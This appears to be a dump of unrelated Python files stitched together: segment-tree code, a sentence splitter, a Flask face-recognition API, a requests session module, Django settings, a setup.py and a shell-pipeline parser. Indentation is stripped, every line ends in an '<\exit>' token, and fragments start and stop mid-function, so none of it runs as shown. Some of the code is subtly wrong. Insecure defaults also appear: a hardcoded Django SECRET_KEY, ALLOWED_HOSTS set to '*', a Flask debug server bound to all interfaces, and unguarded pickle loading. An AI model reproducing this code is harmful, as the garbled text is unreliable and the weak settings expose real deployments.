m = max(m, root.right.max)<\exit>
root.max = m<\exit>
DEFAULT = 0<\exit>
f = lambda x, y: x+y<\exit>
class Solution:<\exit>
def query(self, root, s, e):<\exit>
if not root:<\exit>
return DEFAULT<\exit>
if s <= root.start and e >= root.end:<\exit>
return root.count<\exit>
if s > root.end or e < root.start:<\exit>
return DEFAULT<\exit>
l = self.query(root.left, s, e)<\exit>
r = self.query(root.right, s, e)<\exit>
return f(l, r)<\exit>
import sys<\exit>
class SegmentTreeNode:<\exit>
def __init__(self, start, end, max):<\exit>
self.start, self.end, self.max = start, end, max<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def query(self, root, start, end):<\exit>
if start <= root.start and end >= root.end:<\exit>
return root.max<\exit>
if start > end:<\exit>
return -sys.maxint-1<\exit>
maxa = -sys.maxint-1<\exit>
if root.left:<\exit>
left = self.query(root.left, start, end)<\exit>
maxa = max(maxa, left)<\exit>
if root.right:<\exit>
right = self.query(root.right, start, end)<\exit>
maxa = max(maxa, right)<\exit>
return maxa<\exit>
class Node(object):<\exit>
def __init__(self, lo, hi, cnt):<\exit>
self.lo = lo<\exit>
self.hi = hi<\exit>
self.cnt = cnt<\exit>
self.left = None<\exit>
self.right = None<\exit>
def __repr__(self):<\exit>
return repr("[%d,%d)" % (self.lo, self.hi))<\exit>
class SegmentTree(object):<\exit>
def __init__(self):<\exit>
self.root = None<\exit>
def build(self, lo, hi):<\exit>
if lo >= hi: return<\exit>
if lo == hi-1: return Node(lo, hi, 1)<\exit>
root = Node(lo, hi, hi-lo)<\exit>
root.left = self.build(lo, (hi+lo)/2)<\exit>
root.right = self.build((lo+hi)/2, hi)<\exit>
return root<\exit>
def find_delete(self, root, val):<\exit>
root.cnt -= 1<\exit>
if not root.left:<\exit>
return root.lo<\exit>
elif root.left.cnt >= val:<\exit>
return self.find_delete(root.left, val)<\exit>
else:<\exit>
return self.find_delete(root.right,<\exit>
val - root.left.cnt)<\exit>
class Solution(object):<\exit>
def reconstruct(self, A):<\exit>
st = SegmentTree()<\exit>
n = len(A)<\exit>
st.root = st.build(0, n)<\exit>
A = sorted(A, key=lambda x: x[0])<\exit>
ret = [0]*n<\exit>
for a in A:<\exit>
idx = st.find_delete(st.root, a[1]+1)<\exit>
ret[idx] = a[0]<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
A = [(5, 0), (2, 1), (3, 1), (4, 1,), (1, 4)]<\exit>
assert Solution().reconstruct(A) == [5, 2, 3, 4, 1]<\exit>
import sys<\exit>
from os.path import join as path_join<\exit>
from os.path import dirname<\exit>
from sys import path as sys_path<\exit>
sys_path.append(path_join(dirname(__file__), '../server/src'))<\exit>
from ssplit import regex_sentence_boundary_gen<\exit>
def _text_by_offsets_gen(text, offsets):<\exit>
for start, end in offsets:<\exit>
yield text[start:end]<\exit>
def _normspace(s):<\exit>
import re<\exit>
return re.sub(r'\s', ' ', s)<\exit>
def sentencebreaks_to_newlines(text):<\exit>
line_offset = 1<\exit>
if "\r\n" in text:<\exit>
line_offset = 2<\exit>
offsets = [o for o in regex_sentence_boundary_gen(text)]<\exit>
sentences = [s for s in _text_by_offsets_gen(text, offsets)]<\exit>
orig_parts = []<\exit>
new_parts = []<\exit>
sentnum = len(sentences)<\exit>
for i in range(sentnum):<\exit>
sent = sentences[i]<\exit>
orig_parts.append(sent)<\exit>
new_parts.append(sent)<\exit>
if i < sentnum-1:<\exit>
orig_parts.append(text[offsets[i][1]:offsets[i+1][0]])<\exit>
if (offsets[i][1] < offsets[i+1][0] and<\exit>
text[offsets[i][1]].isspace()):<\exit>
new_parts.append('\n'+text[offsets[i][1]+line_offset:offsets[i+1][0]])<\exit>
else:<\exit>
new_parts.append(text[offsets[i][1]:offsets[i+1][0]])<\exit>
if len(offsets) and offsets[-1][1] < len(text):<\exit>
orig_parts.append(text[offsets[-1][1]:])<\exit>
new_parts.append(text[offsets[-1][1]:])<\exit>
assert text == ''.join(orig_parts), "INTERNAL ERROR:\n    '%s'\nvs\n    '%s'" % (text, ''.join(orig_parts))<\exit>
splittext = ''.join(new_parts)<\exit>
assert len(text) == len(splittext), "INTERNAL ERROR"<\exit>
assert _normspace(text) == _normspace(splittext), "INTERNAL ERROR:\n    '%s'\nvs\n    '%s'" % (_normspace(text), _normspace(splittext))<\exit>
return splittext<\exit>
def main(argv):<\exit>
while True:<\exit>
text = sys.stdin.readline()<\exit>
if len(text) == 0:<\exit>
break<\exit>
sys.stdout.write(sentencebreaks_to_newlines(text))<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import cPickle<\exit>
def save_model(filename, model):<\exit>
output = open(filename, 'wb')<\exit>
cPickle.dump(model, output)<\exit>
output.close()<\exit>
def load_model(filename):<\exit>
pkl_file = open(filename, 'rb')<\exit>
res = cPickle.load(pkl_file)<\exit>
pkl_file.close()<\exit>
return res<\exit>
import cStringIO<\exit>
import base64<\exit>
try:<\exit>
from PIL import Image<\exit>
except ImportError:<\exit>
import Image<\exit>
from flask import Flask, request, request_finished, json, abort, make_response, Response, jsonify<\exit>
import sys<\exit>
sys.path.append("../../..")<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.lbp import ExtendedLBP<\exit>
from facerec.feature import SpatialHistogram<\exit>
from facerec.distance import ChiSquareDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
import logging<\exit>
from logging.handlers import RotatingFileHandler<\exit>
import recognition<\exit>
app = Flask(__name__)<\exit>
IMAGE_DECODE_ERROR = 10<\exit>
IMAGE_RESIZE_ERROR = 11<\exit>
PREDICTION_ERROR = 12<\exit>
SERVICE_TEMPORARY_UNAVAILABLE = 20<\exit>
UNKNOWN_ERROR = 21<\exit>
INVALID_FORMAT = 30<\exit>
INVALID_API_KEY = 31<\exit>
INVALID_API_TOKEN = 32<\exit>
MISSING_ARGUMENTS = 40<\exit>
errors = {<\exit>
IMAGE_DECODE_ERROR : "IMAGE_DECODE_ERROR",<\exit>
IMAGE_RESIZE_ERROR  : "IMAGE_RESIZE_ERROR",<\exit>
SERVICE_TEMPORARY_UNAVAILABLE	: "SERVICE_TEMPORARILY_UNAVAILABLE",<\exit>
PREDICTION_ERROR : "PREDICTION_ERROR",<\exit>
UNKNOWN_ERROR : "UNKNOWN_ERROR",<\exit>
INVALID_FORMAT : "INVALID_FORMAT",<\exit>
INVALID_API_KEY : "INVALID_API_KEY",<\exit>
INVALID_API_TOKEN : "INVALID_API_TOKEN",<\exit>
MISSING_ARGUMENTS : "MISSING_ARGUMENTS"<\exit>
}<\exit>
LOG_FILENAME = 'serverlog.log'<\exit>
LOG_BACKUP_COUNT = 5<\exit>
LOG_FILE_SIZE_BYTES = 50 * 1024 * 1024<\exit>
def init_logger(app):<\exit>
handler = RotatingFileHandler(LOG_FILENAME, maxBytes=LOG_FILE_SIZE_BYTES, backupCount=LOG_BACKUP_COUNT)<\exit>
handler.setLevel(logging.DEBUG)<\exit>
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')<\exit>
handler.setFormatter(formatter)<\exit>
loggers = [app.logger, logging.getLogger('facerec')]<\exit>
for logger in loggers:<\exit>
logger.addHandler(handler)<\exit>
def init_app(app):<\exit>
init_logger(app)<\exit>
init_app(app)<\exit>
@app.before_request<\exit>
def log_request():<\exit>
app.logger.debug("Request: %s %s", request.method, request.url)<\exit>
class WebAppException(Exception):<\exit>
def __init__(self, error_code, exception, status_code=None):<\exit>
Exception.__init__(self)<\exit>
self.status_code = 400<\exit>
self.exception = exception<\exit>
self.error_code = error_code<\exit>
try:<\exit>
self.message = errors[self.error_code]<\exit>
except:<\exit>
self.error_code = UNKNOWN_ERROR<\exit>
self.message = errors[self.error_code]<\exit>
if status_code is not None:<\exit>
self.status_code = status_code<\exit>
def to_dict(self):<\exit>
rv = dict()<\exit>
rv['status'] = 'failed'<\exit>
rv['code'] = self.error_code<\exit>
rv['message'] = self.message<\exit>
return rv<\exit>
class ThrowsWebAppException(object):<\exit>
def __init__(self, error_code, status_code=None):<\exit>
self.error_code = error_code<\exit>
self.status_code = status_code<\exit>
def __call__(self, function):<\exit>
def returnfunction(*args, **kwargs):<\exit>
try:<\exit>
return function(*args, **kwargs)<\exit>
except Exception as e:<\exit>
raise WebAppException(self.error_code, e)<\exit>
return returnfunction<\exit>
@app.errorhandler(WebAppException)<\exit>
def handle_exception(error):<\exit>
app.logger.exception(error.exception)<\exit>
response = jsonify(error.to_dict())<\exit>
response.status_code = error.status_code<\exit>
return response<\exit>
@ThrowsWebAppException(error_code = IMAGE_DECODE_ERROR)<\exit>
def read_image(base64_image):<\exit>
enc_data = base64.b64decode(base64_image)<\exit>
file_like = cStringIO.StringIO(enc_data)<\exit>
im = Image.open(file_like)<\exit>
im = im.convert("L")<\exit>
return im<\exit>
def preprocess_image(image_data):<\exit>
image = read_image(image_data)<\exit>
return image<\exit>
@ThrowsWebAppException(error_code = PREDICTION_ERROR)<\exit>
def get_prediction(image_data):<\exit>
image = preprocess_image(image_data)<\exit>
prediction = model.predict(image)<\exit>
return prediction<\exit>
@app.route('/api/recognize', methods=['GET', 'POST'])<\exit>
def identify():<\exit>
if request.headers['Content-Type'] == 'application/json':<\exit>
try:<\exit>
image_data = request.json['image']<\exit>
except:<\exit>
raise WebAppException(error_code=MISSING_ARGUMENTS)<\exit>
prediction = get_prediction(image_data)<\exit>
response = jsonify(name = prediction)<\exit>
return response<\exit>
else:<\exit>
raise WebAppException(error_code=INVALID_FORMAT)<\exit>
if __name__ == '__main__':<\exit>
long_description = ("server.py is a simple facerec webservice. It provides "<\exit>
"you with a simple RESTful API to recognize faces from a "<\exit>
"computed model. Please don't use this server in a production "<\exit>
"environment, as it provides no security and there might be "<\exit>
"ugly concurrency issues with the global state of the model." )<\exit>
print "=== Description ==="<\exit>
print long_description<\exit>
from argparse import ArgumentParser<\exit>
parser = ArgumentParser()<\exit>
parser.add_argument("-t", "--train", action="store", dest="dataset", default=None,<\exit>
help="Calculates a new model from a given CSV file. CSV format: <person>;</path/to/image/folder>.", required=False)<\exit>
parser.add_argument("-a", "--address", action="store", dest="host", default="0.0.0.0",<\exit>
help="Sets the endpoint for this server.", required=False)<\exit>
parser.add_argument("-p", "--port", action="store", dest="port", default=5000,<\exit>
help="Sets the port for this server.", required=False)<\exit>
parser.add_argument('model_filename', nargs='?', help="Filename of the model to use or store")<\exit>
print "=== Usage ==="<\exit>
parser.print_help()<\exit>
args = parser.parse_args()<\exit>
global model<\exit>
if args.dataset:<\exit>
model = recognition.get_model_from_csv(filename=args.dataset,out_model_filename=args.model_filename)<\exit>
else:<\exit>
model = recognition.load_model_file(args.model_filename)<\exit>
print "=== Server Log (also in %s) ===" % (LOG_FILENAME)<\exit>
app.run(host=args.host, port=args.port, debug=True, use_reloader=False, threaded=False)<\exit>
import os<\exit>
from .compat import cookielib<\exit>
from .cookies import cookiejar_from_dict<\exit>
from .models import Request<\exit>
from .hooks import dispatch_hook, default_hooks<\exit>
from .utils import from_key_val_list, default_headers<\exit>
from .exceptions import TooManyRedirects, InvalidSchema<\exit>
from .compat import urlparse, urljoin<\exit>
from .adapters import HTTPAdapter<\exit>
from .utils import requote_uri, get_environ_proxies, get_netrc_auth<\exit>
from .status_codes import codes<\exit>
REDIRECT_STATI = (codes.moved, codes.found, codes.other, codes.temporary_moved)<\exit>
DEFAULT_REDIRECT_LIMIT = 30<\exit>
def merge_kwargs(local_kwarg, default_kwarg):<\exit>
if default_kwarg is None:<\exit>
return local_kwarg<\exit>
if isinstance(local_kwarg, str):<\exit>
return local_kwarg<\exit>
if local_kwarg is None:<\exit>
return default_kwarg<\exit>
if not hasattr(default_kwarg, 'items'):<\exit>
return local_kwarg<\exit>
default_kwarg = from_key_val_list(default_kwarg)<\exit>
local_kwarg = from_key_val_list(local_kwarg)<\exit>
kwargs = default_kwarg.copy()<\exit>
kwargs.update(local_kwarg)<\exit>
for (k, v) in local_kwarg.items():<\exit>
if v is None:<\exit>
del kwargs[k]<\exit>
return kwargs<\exit>
class SessionRedirectMixin(object):<\exit>
def resolve_redirects(self, resp, req, stream=False, timeout=None, verify=True, cert=None, proxies=None):<\exit>
i = 0<\exit>
while (('location' in resp.headers and resp.status_code in REDIRECT_STATI)):<\exit>
resp.content<\exit>
if i >= self.max_redirects:<\exit>
raise TooManyRedirects('Exceeded %s redirects.' % self.max_redirects)<\exit>
resp.close()<\exit>
url = resp.headers['location']<\exit>
method = req.method<\exit>
if url.startswith('//'):<\exit>
parsed_rurl = urlparse(resp.url)<\exit>
url = '%s:%s' % (parsed_rurl.scheme, url)<\exit>
if not urlparse(url).netloc:<\exit>
url = urljoin(resp.url, requote_uri(url))<\exit>
if resp.status_code is codes.see_other:<\exit>
method = 'GET'<\exit>
if resp.status_code in (codes.moved, codes.found) and req.method == 'POST':<\exit>
method = 'GET'<\exit>
if (resp.status_code == 303) and req.method != 'HEAD':<\exit>
method = 'GET'<\exit>
headers = req.headers<\exit>
try:<\exit>
del headers['Cookie']<\exit>
except KeyError:<\exit>
pass<\exit>
resp = self.request(<\exit>
url=url,<\exit>
method=method,<\exit>
headers=headers,<\exit>
params=req.params,<\exit>
auth=req.auth,<\exit>
cookies=req.cookies,<\exit>
allow_redirects=False,<\exit>
stream=stream,<\exit>
timeout=timeout,<\exit>
verify=verify,<\exit>
cert=cert,<\exit>
proxies=proxies<\exit>
)<\exit>
i += 1<\exit>
yield resp<\exit>
class Session(SessionRedirectMixin):<\exit>
def __init__(self):<\exit>
self.headers = default_headers()<\exit>
self.auth = None<\exit>
self.proxies = {}<\exit>
self.hooks = default_hooks()<\exit>
self.params = {}<\exit>
self.stream = False<\exit>
self.verify = True<\exit>
self.cert = None<\exit>
self.max_redirects = DEFAULT_REDIRECT_LIMIT<\exit>
self.trust_env = True<\exit>
self.cookies = cookiejar_from_dict({})<\exit>
self.adapters = {}<\exit>
self.mount('http://', HTTPAdapter())<\exit>
self.mount('https://', HTTPAdapter())<\exit>
def __enter__(self):<\exit>
return self<\exit>
def __exit__(self, *args):<\exit>
self.close()<\exit>
def request(self, method, url,<\exit>
params=None,<\exit>
data=None,<\exit>
headers=None,<\exit>
cookies=None,<\exit>
files=None,<\exit>
auth=None,<\exit>
timeout=None,<\exit>
allow_redirects=True,<\exit>
proxies=None,<\exit>
hooks=None,<\exit>
stream=None,<\exit>
verify=None,<\exit>
cert=None):<\exit>
cookies = cookies or {}<\exit>
proxies = proxies or {}<\exit>
if not isinstance(cookies, cookielib.CookieJar):<\exit>
cookies = cookiejar_from_dict(cookies)<\exit>
for cookie in self.cookies:<\exit>
cookies.set_cookie(cookie)<\exit>
if self.trust_env:<\exit>
env_proxies = get_environ_proxies(url) or {}<\exit>
for (k, v) in env_proxies.items():<\exit>
proxies.setdefault(k, v)<\exit>
if not auth:<\exit>
auth = get_netrc_auth(url)<\exit>
if not verify and verify is not False:<\exit>
verify = os.environ.get('REQUESTS_CA_BUNDLE')<\exit>
if not verify and verify is not False:<\exit>
verify = os.environ.get('CURL_CA_BUNDLE')<\exit>
params = merge_kwargs(params, self.params)<\exit>
headers = merge_kwargs(headers, self.headers)<\exit>
auth = merge_kwargs(auth, self.auth)<\exit>
proxies = merge_kwargs(proxies, self.proxies)<\exit>
hooks = merge_kwargs(hooks, self.hooks)<\exit>
stream = merge_kwargs(stream, self.stream)<\exit>
verify = merge_kwargs(verify, self.verify)<\exit>
cert = merge_kwargs(cert, self.cert)<\exit>
req = Request()<\exit>
req.method = method<\exit>
req.url = url<\exit>
req.headers = headers<\exit>
req.files = files<\exit>
req.data = data<\exit>
req.params = params<\exit>
req.auth = auth<\exit>
req.cookies = cookies<\exit>
req.hooks = hooks<\exit>
prep = req.prepare()<\exit>
resp = self.send(prep, stream=stream, timeout=timeout, verify=verify, cert=cert, proxies=proxies)<\exit>
for cookie in resp.cookies:<\exit>
self.cookies.set_cookie(cookie)<\exit>
gen = self.resolve_redirects(resp, req, stream=stream, timeout=timeout, verify=verify, cert=cert, proxies=proxies)<\exit>
history = [r for r in gen] if allow_redirects else []<\exit>
if history:<\exit>
history.insert(0, resp)<\exit>
resp = history.pop()<\exit>
resp.history = tuple(history)<\exit>
self.response = dispatch_hook('response', hooks, resp)<\exit>
return resp<\exit>
def get(self, url, **kwargs):<\exit>
kwargs.setdefault('allow_redirects', True)<\exit>
return self.request('GET', url, **kwargs)<\exit>
def options(self, url, **kwargs):<\exit>
kwargs.setdefault('allow_redirects', True)<\exit>
return self.request('OPTIONS', url, **kwargs)<\exit>
def head(self, url, **kwargs):<\exit>
kwargs.setdefault('allow_redirects', False)<\exit>
return self.request('HEAD', url, **kwargs)<\exit>
def post(self, url, data=None, **kwargs):<\exit>
return self.request('POST', url, data=data, **kwargs)<\exit>
def put(self, url, data=None, **kwargs):<\exit>
return self.request('PUT', url, data=data, **kwargs)<\exit>
def patch(self, url, data=None, **kwargs):<\exit>
return self.request('PATCH', url,  data=data, **kwargs)<\exit>
def delete(self, url, **kwargs):<\exit>
return self.request('DELETE', url, **kwargs)<\exit>
def send(self, request, **kwargs):<\exit>
adapter = self.get_adapter(url=request.url)<\exit>
r = adapter.send(request, **kwargs)<\exit>
return r<\exit>
def get_adapter(self, url):<\exit>
for (prefix, adapter) in self.adapters.items():<\exit>
if url.startswith(prefix):<\exit>
return adapter<\exit>
raise InvalidSchema("No connection adapters were found for '%s'" % url)<\exit>
def close(self):<\exit>
for _, v in self.adapters.items():<\exit>
v.close()<\exit>
def mount(self, prefix, adapter):<\exit>
self.adapters[prefix] = adapter<\exit>
def __getstate__(self):<\exit>
return dict((attr, getattr(self, attr, None)) for attr in self.__attrs__)<\exit>
def __setstate__(self, state):<\exit>
for attr, value in state.items():<\exit>
setattr(self, attr, value)<\exit>
def session():<\exit>
return Session()<\exit>
import os<\exit>
import dj_database_url<\exit>
BASE_DIR = os.path.dirname(os.path.abspath(__file__))<\exit>
SECRET_KEY = 'zepnf(4ontqc)o2=owlr5354698rgdw_l8!8%rl056$d(td)!u'<\exit>
DEBUG = False<\exit>
ALLOWED_HOSTS = ["*"]<\exit>
INSTALLED_APPS = (<\exit>
'django.contrib.admin',<\exit>
'django.contrib.auth',<\exit>
'django.contrib.contenttypes',<\exit>
'django.contrib.sessions',<\exit>
'django.contrib.messages',<\exit>
'django.contrib.staticfiles',<\exit>
'rake_app',<\exit>
)<\exit>
MIDDLEWARE_CLASSES = (<\exit>
'django.contrib.sessions.middleware.SessionMiddleware',<\exit>
'django.middleware.common.CommonMiddleware',<\exit>
'django.middleware.csrf.CsrfViewMiddleware',<\exit>
'django.contrib.auth.middleware.AuthenticationMiddleware',<\exit>
'django.contrib.auth.middleware.SessionAuthenticationMiddleware',<\exit>
'django.contrib.messages.middleware.MessageMiddleware',<\exit>
'django.middleware.clickjacking.XFrameOptionsMiddleware',<\exit>
'django.middleware.security.SecurityMiddleware',<\exit>
)<\exit>
ROOT_URLCONF = 'tagr.urls'<\exit>
TEMPLATES = [<\exit>
{<\exit>
'BACKEND': 'django.template.backends.django.DjangoTemplates',<\exit>
'DIRS': [<\exit>
os.path.join(BASE_DIR, 'templates').replace('\\', '/'),<\exit>
],<\exit>
'APP_DIRS': True,<\exit>
'OPTIONS': {<\exit>
'context_processors': [<\exit>
'django.template.context_processors.debug',<\exit>
'django.template.context_processors.request',<\exit>
'django.contrib.auth.context_processors.auth',<\exit>
'django.contrib.messages.context_processors.messages',<\exit>
],<\exit>
},<\exit>
},<\exit>
]<\exit>
WSGI_APPLICATION = 'tagr.wsgi.application'<\exit>
DATABASES = {<\exit>
'default': {<\exit>
'ENGINE': 'django.db.backends.sqlite3',<\exit>
'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),<\exit>
}<\exit>
}<\exit>
LANGUAGE_CODE = 'en-us'<\exit>
TIME_ZONE = 'UTC'<\exit>
USE_I18N = True<\exit>
USE_L10N = True<\exit>
USE_TZ = True<\exit>
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')<\exit>
STATIC_ROOT = 'staticfiles'<\exit>
STATIC_URL = '/static/'<\exit>
STATICFILES_DIRS = (<\exit>
os.path.join(BASE_DIR, 'static'),<\exit>
)<\exit>
STATICFILES_STORAGE = 'whitenoise.django.GzipManifestStaticFilesStorage'<\exit>
MEDIA_URL = 'media/'<\exit>
MEDIA_DIRS = (<\exit>
os.path.join(BASE_DIR, 'media'),<\exit>
)<\exit>
from distutils.core import setup<\exit>
import os<\exit>
setup(<\exit>
name         = 'snippyt',<\exit>
version      = '0.0.1',<\exit>
author       = 'Daniel D. Zhang',<\exit>
author_email = 'dzhang.idf@gmail.com',<\exit>
license      = 'BSD-3',<\exit>
description  = 'A command line snippet management for modern developers.',<\exit>
url          = 'https://github.com/idf/snippyt',<\exit>
packages     = [<\exit>
'snippyt',<\exit>
'snippyt.templates',<\exit>
],<\exit>
package_data = {<\exit>
'snippyt.templates': [f for f in os.listdir('snippyt/templates') if '.' not in f]<\exit>
},<\exit>
scripts          = ['snip'],<\exit>
install_requires = [<\exit>
'docopt >= 0.6.2',<\exit>
'Jinja2 >= 2.9.5',<\exit>
'MarkupSafe >= 1.0',<\exit>
]<\exit>
)<\exit>
import shlex<\exit>
import subprocess<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
env_var_rx = re.compile(r"^([a-zA-Z0-9_]+)=(\S+)$")<\exit>
def debug(message):<\exit>
print >> sys.stderr, message<\exit>
if sys.platform == 'win32':<\exit>
dev_null = open("NUL:", "w")<\exit>
else:<\exit>
dev_null = open("/dev/null", "w")<\exit>
fcntl = fd = fl = None<\exit>
try:<\exit>
import fcntl<\exit>
except ImportError:<\exit>
pass<\exit>
else:<\exit>
fd = dev_null.fileno()<\exit>
fl = fcntl.fcntl(fd, fcntl.F_GETFD)<\exit>
fcntl.fcntl(fd, fcntl.F_SETFD, fl | fcntl.FD_CLOEXEC)<\exit>
del fcntl, fd, fl<\exit>
def _open_out_file(filename):<\exit>
if filename in ['NUL:', '/dev/null']:<\exit>
return dev_null<\exit>
else:<\exit>
return open(filename, 'wb')<\exit>
class Node(object):<\exit>
pass<\exit>
class Op(Node):<\exit>
pass<\exit>
class Pipe(Op):<\exit>
pass<\exit>
class And(Op):<\exit>
pass<\exit>
class Or(Op):<\exit>
pass<\exit>
class Command(Node):<\exit>
class PIPE(object):<\exit>
pass<\exit>
class STDOUT(object):<\exit>
pass<\exit>
def __init__(self, name):<\exit>
super(Command, self).__init__()<\exit>
self.name = name<\exit>
self.argv = [name]<\exit>
self.stdin = None<\exit>
self.stdout = None<\exit>
self.stderr = None<\exit>
self.env_vars = None<\exit>
def __repr__(self):<\exit>
return "Command(%r, argv=%r, stdin=%r, stdout=%r, stderr=%r)" \<\exit>
% (self.name, self.argv, self.stdin, self.stdout, self.stderr)<\exit>
class Chdir(Node):<\exit>
def __init__(self):<\exit>
super(Chdir, self).__init__()<\exit>
self.dir = None<\exit>
def __repr__(self):<\exit>
return "Chdir(%r)" \<\exit>
% (self.dir)<\exit>
class Pipeline(object):<\exit>
def __init__(self):<\exit>
self.current_command = None<\exit>
self.pipeline = []<\exit>
def _commit_command(self):<\exit>
assert self.current_command is not None<\exit>
self.pipeline.append(self.current_command)<\exit>
self.current_command = None<\exit>
def get_abbreviated_command(self):<\exit>
l = []<\exit>
for node in self.pipeline:<\exit>
if isinstance(node, Command):<\exit>
l.append(node.name)<\exit>
if isinstance(node, Chdir):<\exit>
l.append('cd %s' % node.dir)<\exit>
elif isinstance(node, Pipe):<\exit>
l.append('|')<\exit>
elif isinstance(node, And):<\exit>
l.append('&&')<\exit>
elif isinstance(node, And):<\exit>
l.append('||')<\exit>
return ' '.join(l)<\exit>
def parse(self, command):<\exit>
self.current_command = None<\exit>
self.pipeline = []<\exit>
if isinstance(command, list):<\exit>
tokens = list(command)<\exit>
else:<\exit>
tokens = shlex.split(command)<\exit>
debug("command: shlex: %r" % (tokens,))<\exit>
BEGIN, COMMAND, CHDIR, STDERR, STDOUT, STDIN = range(6)<\exit>
state = BEGIN<\exit>
self.current_command = None<\exit>
env_vars = dict()<\exit>
while tokens:<\exit>
token = tokens.pop(0)<\exit>
if state == BEGIN:<\exit>
env_var_match = env_var_rx.match(token)<\exit>
if env_var_match is not None:<\exit>
env_vars[env_var_match.group(1)] = env_var_match.group(2)<\exit>
else:<\exit>
assert self.current_command is None<\exit>
if token == 'cd':<\exit>
self.current_command = Chdir()<\exit>
assert not env_vars<\exit>
state = CHDIR<\exit>
else:<\exit>
self.current_command = Command(token)<\exit>
if env_vars:<\exit>
self.current_command.env_vars = env_vars<\exit>
env_vars = dict()<\exit>
state = COMMAND<\exit>
elif state == COMMAND:<\exit>
if token == '>':<\exit>
state = STDOUT<\exit>
elif token == '2>':<\exit>
state = STDERR<\exit>
elif token == '2>&1':<\exit>
assert self.current_command.stderr is None<\exit>
self.current_command.stderr = Command.STDOUT<\exit>
elif token == '<':<\exit>
state = STDIN<\exit>
elif token == '|':<\exit>
assert self.current_command.stdout is None<\exit>
self.current_command.stdout = Command.PIPE<\exit>
self._commit_command()<\exit>
self.pipeline.append(Pipe())<\exit>
state = BEGIN<\exit>
elif token == '&&':<\exit>
self._commit_command()<\exit>
self.pipeline.append(And())<\exit>
state = BEGIN<\exit>
elif token == '||':<\exit>
self._commit_command()<\exit>
self.pipeline.append(Or())<\exit>
state = BEGIN<\exit>
else:<\exit>
self.current_command.argv.append(token)<\exit>
elif state == CHDIR:<\exit>
if token == '&&':<\exit>
self._commit_command()<\exit>
self.pipeline.append(And())<\exit>
state = BEGIN<\exit>
else:<\exit>
assert self.current_command.dir is None<\exit>
self.current_command.dir = token<\exit>
elif state == STDOUT:<\exit>
assert self.current_command.stdout is None<\exit>
self.current_command.stdout = token<\exit>
state = COMMAND<\exit>
elif state == STDERR:<\exit>
assert self.current_command.stderr is None<\exit>
self.current_command.stderr = token<\exit>
state = COMMAND<\exit>
elif state == STDIN:<\exit>
assert self.current_command.stdin is None<\exit>
self.current_command.stdin = token<\exit>
state = COMMAND<\exit>
self._commit_command()<\exit>
return self.pipeline<\exit>
def _exec_piped_commands(self, commands):<\exit>
retvals = []<\exit>
for cmd in commands:<\exit>
retvals.append(cmd.wait())<\exit>
retval = 0<\exit>
for r in retvals:<\exit>
if r:<\exit>
retval = retvals[-1]<\exit>
break<\exit>
return retval<\exit>
def run(self, verbose=False):<\exit>
pipeline = list(self.pipeline)<\exit>
files_to_close = []<\exit>
piped_commands = []<\exit>
piped_commands_display = []<\exit>
BEGIN, PIPE = range(2)<\exit>
state = BEGIN<\exit>
cwd = '.'<\exit>
while pipeline:<\exit>
node = pipeline.pop(0)<\exit>
if isinstance(node, Chdir):<\exit>
next_op = pipeline.pop(0)<\exit>
assert isinstance(next_op, And)<\exit>
cwd = os.path.join(cwd, node.dir)<\exit>
if verbose:<\exit>
piped_commands_display.append("cd %s &&" % node.dir)<\exit>
continue<\exit>
assert isinstance(node, (Command, Chdir))<\exit>
cmd = node<\exit>
if verbose:<\exit>
if cmd.env_vars:<\exit>
env_vars_str = ' '.join(['%s=%s' % (key, val) for key, val in cmd.env_vars.iteritems()])<\exit>
piped_commands_display.append("%s %s" % (env_vars_str, ' '.join(cmd.argv)))<\exit>
else:<\exit>
piped_commands_display.append(' '.join(cmd.argv))<\exit>
if state == PIPE:<\exit>
stdin = piped_commands[-1].stdout<\exit>
elif cmd.stdin is not None:<\exit>
stdin = open(cmd.stdin, "r")<\exit>
if verbose:<\exit>
piped_commands_display.append('< %s' % cmd.stdin)<\exit>
files_to_close.append(stdin)<\exit>
else:<\exit>
stdin = None<\exit>
if cmd.stdout is None:<\exit>
stdout = None<\exit>
elif cmd.stdout is Command.PIPE:<\exit>
stdout = subprocess.PIPE<\exit>
else:<\exit>
stdout = _open_out_file(cmd.stdout)<\exit>
files_to_close.append(stdout)<\exit>
if verbose:<\exit>
piped_commands_display.append('> %s' % cmd.stdout)<\exit>
if cmd.stderr is None:<\exit>
stderr = None<\exit>
elif cmd.stderr is Command.PIPE:<\exit>
stderr = subprocess.PIPE<\exit>
elif cmd.stderr is Command.STDOUT:<\exit>
stderr = subprocess.STDOUT<\exit>
if verbose:<\exit>
piped_commands_display.append('2>&1')<\exit>
else:<\exit>
stderr = _open_out_file(cmd.stderr)<\exit>
files_to_close.append(stderr)<\exit>
if verbose:<\exit>
piped_commands_display.append('2> %s' % cmd.stderr)<\exit>
if cmd.env_vars:<\exit>
env = dict(os.environ)<\exit>
env.update(cmd.env_vars)<\exit>
else:<\exit>
env = None<\exit>
if cwd == '.':<\exit>
proc_cwd = None<\exit>
else:<\exit>
proc_cwd = cwd<\exit>
debug("command: subprocess.Popen(argv=%r, stdin=%r, stdout=%r, stderr=%r, env_vars=%r, cwd=%r)"<\exit>
% (cmd.argv, stdin, stdout, stderr, cmd.env_vars, proc_cwd))<\exit>
proc = subprocess.Popen(cmd.argv, stdin=stdin, stdout=stdout, stderr=stderr, env=env, cwd=proc_cwd)<\exit>
del stdin, stdout, stderr<\exit>
piped_commands.append(proc)<\exit>
try:<\exit>
next_node = pipeline.pop(0)<\exit>
except IndexError:<\exit>
try:<\exit>
retval = self._exec_piped_commands(piped_commands)<\exit>
if verbose:<\exit>
print "%s: exit code %i" % (' '.join(piped_commands_display), retval)<\exit>
finally:<\exit>
for f in files_to_close:<\exit>
if f is not dev_null:<\exit>
f.close()<\exit>
files_to_close = []<\exit>
return retval<\exit>
else:<\exit>
if isinstance(next_node, Pipe):<\exit>
state = PIPE<\exit>
piped_commands_display.append('|')<\exit>
elif isinstance(next_node, Or):<\exit>
try:<\exit>
this_retval = self._exec_piped_commands(piped_commands)<\exit>
finally:<\exit>
for f in files_to_close:<\exit>
if f is not dev_null:<\exit>
